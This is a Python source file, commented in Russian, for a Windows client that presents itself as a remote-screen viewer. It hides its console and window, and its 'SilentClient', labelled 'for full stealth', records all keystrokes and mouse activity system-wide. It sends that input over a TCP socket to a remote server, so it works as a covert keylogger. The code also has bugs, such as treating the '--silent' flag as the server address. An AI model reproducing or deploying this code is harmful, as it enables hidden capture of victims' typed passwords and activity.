import socket
import threading
import cv2
import numpy as np
import tkinter as tk
from tkinter import messagebox, simpledialog
import struct
import pickle
import time
import sys
import os
import win32gui
import win32con
import win32api
import ctypes
from ctypes import wintypes

class HiddenClient:
    def __init__(self):
        self.socket = None
        self.running = False
        self.server_ip = None
        self.server_port = None
        
        # Скрываем консольное окно
        self.hide_console()
        
        # Показываем диалог подключения только один раз
        if not self.show_connection_dialog():
            sys.exit(0)
            
        # Скрываем приложение полностью
        self.hide_application()
        
    def hide_console(self):
        """Скрывает консольное окно"""
        try:
            # Получаем handle консольного окна
            console_window = win32gui.GetForegroundWindow()
            # Скрываем окно
            win32gui.ShowWindow(console_window, win32con.SW_HIDE)
        except:
            pass
            
    def hide_application(self):
        """Скрывает приложение полностью"""
        try:
            # Получаем handle текущего процесса
            hwnd = win32gui.GetForegroundWindow()
            # Скрываем окно
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        except:
            pass
            
    def show_connection_dialog(self):
        """Показывает диалог для ввода IP и порта"""
        try:
            # Создаем скрытое окно для диалога
            root = tk.Tk()
            root.withdraw()  # Скрываем основное окно
            
            # Показываем диалог
            server_ip = simpledialog.askstring("Connection", 
                                             "Enter server IP address:",
                                             parent=root)
            if not server_ip:
                root.destroy()
                return False
                
            server_port = simpledialog.askstring("Connection", 
                                               "Enter server port (default: 9999):",
                                               parent=root)
            if not server_port:
                server_port = "9999"
                
            try:
                self.server_port = int(server_port)
            except ValueError:
                messagebox.showerror("Error", "Invalid port number")
                root.destroy()
                return False
                
            self.server_ip = server_ip
            root.destroy()
            return True
            
        except Exception as e:
            return False
            
    def connect_to_server(self):
        """Подключается к серверу"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.running = True
            return True
        except Exception as e:
            return False
            
    def receive_screen(self):
        """Принимает и отображает скриншоты от сервера"""
        try:
            while self.running and self.socket:
                # Получаем размер данных
                data_size = struct.unpack('!I', self.socket.recv(4))[0]
                
                # Получаем данные изображения
                data = b''
                while len(data) < data_size:
                    packet = self.socket.recv(data_size - len(data))
                    if not packet:
                        break
                    data += packet
                    
                if len(data) == data_size:
                    # Декодируем изображение
                    frame_data = np.frombuffer(data, dtype=np.uint8)
                    frame = cv2.imdecode(frame_data, cv2.IMREAD_COLOR)
                    
                    # Отображаем изображение
                    cv2.imshow('Remote Screen', frame)
                    
                    # Обрабатываем события окна
                    key = cv2.waitKey(1) & 0xFF
                    if key == 27:  # ESC
                        break
                        
        except Exception as e:
            pass
        finally:
            cv2.destroyAllWindows()
            
    def send_control_events(self):
        """Отправляет события управления на сервер"""
        try:
            # Создаем окно для захвата событий
            cv2.namedWindow('Remote Screen', cv2.WINDOW_NORMAL)
            cv2.setMouseCallback('Remote Screen', self.on_mouse_event)
            
            # Захватываем клавиатуру
            def on_key_press(key):
                try:
                    command = {
                        'type': 'key_press',
                        'key': key.char if hasattr(key, 'char') else str(key)
                    }
                    self.socket.send(pickle.dumps(command))
                except:
                    pass
                    
            def on_key_release(key):
                pass
                
            # Запускаем слушатель клавиатуры в отдельном потоке
            from pynput import keyboard
            keyboard_listener = keyboard.Listener(
                on_press=on_key_press,
                on_release=on_key_release)
            keyboard_listener.start()
            
        except Exception as e:
            pass
            
    def on_mouse_event(self, event, x, y, flags, param):
        """Обрабатывает события мыши"""
        try:
            if event == cv2.EVENT_MOUSEMOVE:
                command = {
                    'type': 'mouse_move',
                    'x': x,
                    'y': y
                }
                self.socket.send(pickle.dumps(command))
                
            elif event == cv2.EVENT_LBUTTONDOWN:
                command = {
                    'type': 'mouse_click',
                    'x': x,
                    'y': y,
                    'button': 'left'
                }
                self.socket.send(pickle.dumps(command))
                
            elif event == cv2.EVENT_RBUTTONDOWN:
                command = {
                    'type': 'mouse_click',
                    'x': x,
                    'y': y,
                    'button': 'right'
                }
                self.socket.send(pickle.dumps(command))
                
        except:
            pass
            
    def run(self):
        """Запускает клиент"""
        if not self.connect_to_server():
            return
            
        # Запускаем потоки
        screen_thread = threading.Thread(target=self.receive_screen)
        screen_thread.daemon = True
        screen_thread.start()
        
        control_thread = threading.Thread(target=self.send_control_events)
        control_thread.daemon = True
        control_thread.start()
        
        # Основной цикл
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()
            
    def cleanup(self):
        """Очищает ресурсы"""
        self.running = False
        if self.socket:
            self.socket.close()
        cv2.destroyAllWindows()

# Альтернативная версия клиента без GUI (для полной скрытности)
class SilentClient:
    def __init__(self):
        self.socket = None
        self.running = False
        self.server_ip = None
        self.server_port = None
        
        # Получаем параметры подключения из аргументов командной строки
        if len(sys.argv) >= 3:
            self.server_ip = sys.argv[1]
            try:
                self.server_port = int(sys.argv[2])
            except ValueError:
                self.server_port = 9999
        else:
            # Если аргументы не переданы, используем значения по умолчанию
            self.server_ip = "127.0.0.1"
            self.server_port = 9999
            
    def connect_to_server(self):
        """Подключается к серверу"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.running = True
            return True
        except Exception as e:
            return False
            
    def receive_screen(self):
        """Принимает скриншоты от сервера (без отображения)"""
        try:
            while self.running and self.socket:
                # Получаем размер данных
                data_size = struct.unpack('!I', self.socket.recv(4))[0]
                
                # Получаем данные изображения
                data = b''
                while len(data) < data_size:
                    packet = self.socket.recv(data_size - len(data))
                    if not packet:
                        break
                    data += packet
                    
                # Просто игнорируем данные изображения
                time.sleep(0.01)
                
        except Exception as e:
            pass
            
    def send_control_events(self):
        """Отправляет события управления на сервер"""
        try:
            from pynput import mouse, keyboard
            
            def on_mouse_move(x, y):
                try:
                    command = {
                        'type': 'mouse_move',
                        'x': x,
                        'y': y
                    }
                    self.socket.send(pickle.dumps(command))
                except:
                    pass
                    
            def on_mouse_click(x, y, button, pressed):
                if pressed:
                    try:
                        command = {
                            'type': 'mouse_click',
                            'x': x,
                            'y': y,
                            'button': 'left' if button == mouse.Button.left else 'right'
                        }
                        self.socket.send(pickle.dumps(command))
                    except:
                        pass
                        
            def on_key_press(key):
                try:
                    command = {
                        'type': 'key_press',
                        'key': key.char if hasattr(key, 'char') else str(key)
                    }
                    self.socket.send(pickle.dumps(command))
                except:
                    pass
                    
            # Запускаем слушатели
            mouse_listener = mouse.Listener(
                on_move=on_mouse_move,
                on_click=on_mouse_click)
            mouse_listener.start()
            
            keyboard_listener = keyboard.Listener(
                on_press=on_key_press)
            keyboard_listener.start()
            
        except Exception as e:
            pass
            
    def run(self):
        """Запускает клиент"""
        if not self.connect_to_server():
            return
            
        # Запускаем потоки
        screen_thread = threading.Thread(target=self.receive_screen)
        screen_thread.daemon = True
        screen_thread.start()
        
        control_thread = threading.Thread(target=self.send_control_events)
        control_thread.daemon = True
        control_thread.start()
        
        # Основной цикл
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()
            
    def cleanup(self):
        """Очищает ресурсы"""
        self.running = False
        if self.socket:
            self.socket.close()

if __name__ == "__main__":
    # Выбираем тип клиента в зависимости от аргументов
    if len(sys.argv) > 1 and sys.argv[1] == "--silent":
        client = SilentClient()
    else:
        client = HiddenClient()
        
    client.run() 